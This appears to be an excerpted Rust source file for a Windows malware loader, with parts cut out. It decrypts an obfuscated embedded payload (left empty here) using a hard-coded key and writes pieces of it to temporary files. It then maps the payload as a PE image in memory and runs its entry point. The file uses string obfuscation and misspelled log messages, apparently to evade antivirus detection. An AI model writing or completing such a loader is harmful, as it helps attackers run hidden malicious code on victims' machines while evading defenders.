...
#[cfg(windows)]
use obfuscator::obfuscate_bytes;
#[cfg(windows)]
...
static SECRET_KEY: Lazy<Vec<u8>> = Lazy::new(|| {
    obfuscate_bytes!(&[
        0xe1, 0x61, 0x18, 0xa4, 0x8a, 0x7f, 0x26, 0xcb, 0x13, 0x83, 0xd6, 0x2c, 0x21, 0x11, 0x0e,
        0x69, 0x65, 0xc0, 0xc6, 0x40, 0x5d, 0xfc, 0x1e, 0x4f, 0x16, 0x67, 0x89, 0xee, 0x3b, 0x4a,
        0xfe, 0x23,
    ])
});

#[cfg(windows)]
static PAYLOAD: Lazy<Vec<u8>> = Lazy::new(|| {
    obfuscate_bytes!(&[
        //payload here
    ])
});
...
fn split_and_save_payload(data: &[u8]) -> Result<(), String> {
    ...
    for (i, filename) in file_names.iter().enumerate() {
        let end = if i == 2 {
            ...
            std::cmp::min(start + part_size, data.len())
        };
        
        let file_path = temp_dir.join(filename);
        let mut file = File::create(&file_path)
            .map_err(|e| format!("Failed to create t3mp file {}: {}", filename, e))?;
        
        file.write_all(&data[start..end])
            .map_err(|e| format!("Failed to write to t3mp file {}: {}", filename, e))?;
...
unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
    ...
    if nt_headers.optional_header.subsystem == 2 || nt_headers.optional_header.subsystem == 3 {
        ...
        dll_main(image_base as HMODULE, 1, ptr::null_mut());
    }
...
fn main() {
    ...
    {
        if PAYLOAD.is_empty() {
            eprintln!("{}", obfuscate_string!("[ERROR] The PAYLOAD is empty. "));
            return;
        }

        let decoded_payload = transform_data(PAYLOAD, SECRET_KEY);
        if let Err(e) = split_and_save_payload(&decoded_payload) {
            eprintln!("{}{}", obfuscate_string!("[WARNING] Failed to split and save payload to t3mp files: "), e);
        }

        unsafe {
            if let Err(e) = load_pe_from_memory(&decoded_payload) {
                eprintln!("{}{}", obfuscate_string!("[ERROR] Fa2led to load P.E from MEM0ry: "), e);
            }
        }
    }
    #[cfg(not(windows))]
    {
        eprintln!("{}", obfuscate_string!("[ERROR] This program is intended to  on Windows SADXASDSAD."));
    }
}
